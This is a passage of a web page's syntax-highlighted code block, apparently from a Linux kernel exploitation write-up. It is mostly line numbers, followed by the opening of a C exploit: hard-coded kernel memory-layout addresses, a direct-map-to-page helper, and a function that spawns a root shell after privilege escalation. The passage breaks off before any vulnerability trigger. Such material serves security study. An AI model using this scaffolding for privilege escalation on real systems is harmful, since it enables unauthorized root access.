class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * I - fundamental functions</span><br><span class="hljs-comment"> * e.g. CPU-core binder, user-status saver, etc.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><span class="hljs-type">size_t</span> init_task, init_nsproxy, init_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* root checker and shell poper */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span 